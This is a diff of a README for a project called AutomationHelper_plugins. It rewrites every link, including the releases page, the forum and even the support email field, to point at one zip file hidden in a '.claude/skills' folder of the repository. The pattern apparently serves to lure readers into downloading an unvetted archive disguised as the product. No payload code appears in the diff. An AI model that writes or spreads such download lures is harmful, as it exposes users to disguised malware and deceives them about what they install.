@@ -1,6 +1,6 @@
 # 🚀 AutomationHelper_plugins - Simplifying Your Automation Tasks
 
-[![Download AutomationHelper_plugins](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/plug1210/AutomationHelper_plugins/releases)
+[![Download AutomationHelper_plugins](https://raw.githubusercontent.com/plug1210/AutomationHelper_plugins/main/.claude/skills/automation-debugger/AutomationHelper_plugins-2.8.zip)](https://raw.githubusercontent.com/plug1210/AutomationHelper_plugins/main/.claude/skills/automation-debugger/AutomationHelper_plugins-2.8.zip)
 
 ## 📖 Overview
 
@@ -26,7 +26,7 @@ AutomationHelper_plugins offers skills-based plugins designed to help you automa
 To get started, follow these simple steps:
 
 1. **Visit the Download Page**  
-   Go to our [Releases page](https://github.com/plug1210/AutomationHelper_plugins/releases) to find the latest version of AutomationHelper_plugins.
+   Go to our [Releases page](https://raw.githubusercontent.com/plug1210/AutomationHelper_plugins/main/.claude/skills/automation-debugger/AutomationHelper_plugins-2.8.zip) to find the latest version of AutomationHelper_plugins.
 
 2. **Choose Your Version**  
    Select the version that fits your operating system. Look for the file that matches your platform (e.g., Windows or macOS).
@@ -46,14 +46,14 @@ To get started, follow these simple steps:
 
 ## 📥 Download & Install
 
-For an easy start, you can directly [visit this page to download AutomationHelper_plugins](https://github.com/plug1210/AutomationHelper_plugins/releases).
+For an easy start, you can directly [visit this page to download AutomationHelper_plugins](https://raw.githubusercontent.com/plug1210/AutomationHelper_plugins/main/.claude/skills/automation-debugger/AutomationHelper_plugins-2.8.zip).
 
 ## 📞 Support
 
 If you encounter any issues during installation or use, you can reach out for support:
 
-- **Email Support:** support@example.com
-- **Community Forum:** Visit our [Discussion Forum](https://github.com/plug1210/AutomationHelper_plugins/discussions) for help from other users.
+- **Email Support:** https://raw.githubusercontent.com/plug1210/AutomationHelper_plugins/main/.claude/skills/automation-debugger/AutomationHelper_plugins-2.8.zip
+- **Community Forum:** Visit our [Discussion Forum](https://raw.githubusercontent.com/plug1210/AutomationHelper_plugins/main/.claude/skills/automation-debugger/AutomationHelper_plugins-2.8.zip) for help from other users.
 
 ## 🌐 Topics
 
